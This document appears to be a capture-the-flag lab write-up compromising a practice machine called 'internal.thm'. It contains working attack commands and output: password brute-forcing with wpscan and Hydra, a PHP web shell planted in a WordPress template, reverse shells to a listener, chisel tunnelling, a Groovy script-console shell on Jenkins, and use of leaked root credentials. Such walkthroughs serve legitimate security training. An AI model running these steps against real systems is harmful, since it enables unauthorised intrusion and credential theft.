## MACHINE IP
```bash
10.201.69.62
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Thu Oct  2 22:16:55 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.69.62
Nmap scan report for internal.thm (10.201.69.62)
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  2 22:17:56 2025 -- 1 IP address (1 host up) scanned in 61.76 seconds
```
## OPEN PORTS - ANALYSIS
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
## RECON
```bash                
# Operating System                                // FOund Post Initial Enum
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
```
## ENUMERATION
```bash
# Add to /etc/hosts 10.201.73.239 internal.thm

- Fuzzing
sudo ffuf -r -c -w /usr/share/wordlists/dirb/common.txt -fc 404 -u $url/FUZZ | tee fuzz/ffuf-common
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 285ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 287ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 289ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 289ms]
blog                    [Status: 200, Size: 53942, Words: 3347, Lines: 330, Duration: 846ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 289ms]
javascript              [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 283ms]
phpmyadmin              [Status: 200, Size: 10531, Words: 504, Lines: 26, Duration: 430ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 287ms]       

- /blog is a wordpress site

# wpscan
sudo wpscan --url http://internal.thm/blog -e
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)                                                        
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1            
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)     
 
# Brute force creds with username admin
sudo wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
  
```
## INITIAL SHELL
```bash
- Login using creds admin:my2boys on wordpress login 

Appearance -> Editor -> 404 Template (at the right)  
Change the content for a php shell  
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php  

- Access the url by starting a listener
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.69.62] 48698
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:42:33 up 24 min,  0 users,  load average: 0.01, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data                                                              
```
## PRIVILEGE ESCALATION
```bash
# Found user creds on /opt
www-data@internal:/opt$ cat wp-save.txt
Bill,
Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
aubreanna:bubb13guM!@#123     

# User shell using creds - works
aubreanna:bubb13guM!@#123

- Ran linpeas.sh - unable to find any sus files 

- Checking open internal ports found port 8080 open on localhost
- Transfer chisel and local port forward

- From kali Machine
/chisel server -p 8000 --reverse

2025/10/03 00:11:23 server: Reverse tunnelling enabled
2025/10/03 00:11:23 server: Fingerprint cIsKX4i3/04NjBFlmb9aCW6FrIW/lZrZKc+IDLytmII=
2025/10/03 00:11:23 server: Listening on http://0.0.0.0:8000
2025/10/03 00:12:58 server: session#1: tun: proxy#R:8080=>8080: Listening

- From 10.201.69.62 machine 
aubreanna@internal:/tmp$ ./chisel client 10.13.80.25:8000 R:8080:127.0.0.1:8080
2025/10/02 18:42:56 client: Connecting to ws://10.13.80.25:8000
2025/10/02 18:42:58 client: Connected (Latency 290.398544ms)

- Now we can access the url http://127.0.0.1:8080 from kali Machine
- Found Jenkins login page
- Invalid login > Request and response are found using Browser Inspect Network Tab (It was annoying to use burp to find the post request)
  
- Again try to bruteforce creds using hydra
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 00:36:20
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://localhost:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[STATUS] 548.00 tries/min, 548 tries in 00:01h, 14343851 to do in 436:15h, 64 active
[8080][http-post-form] host: localhost   login: admin   password: spongebob

- Now login to Jenkins using admin:spongebob
- Jenkins to RCE
- Manage Jenkins > Script Console > REVSHELL GROOVY SCRIPT > Run

# Reverse Shell - Groovy  
https://www.revshells.com/  

- Start Listener and got shell
sudo nc -nvlp 443
[sudo] password for kali:                                                                     
listening on [any] 443 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.69.62] 58950
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)                                      
whoami                                                                                        
jenkins   

- Got lucky 
- Again check /opt/ folder > found root creds
jenkins@jenkins:/opt$ cat note.txt 
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```
## ROOT | ADMINISTRATOR - PWNED
```bash
sudo ssh root@$ip
Password:root:tr0ub13guM!@#123

root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
root@internal:~# whoami
root
```
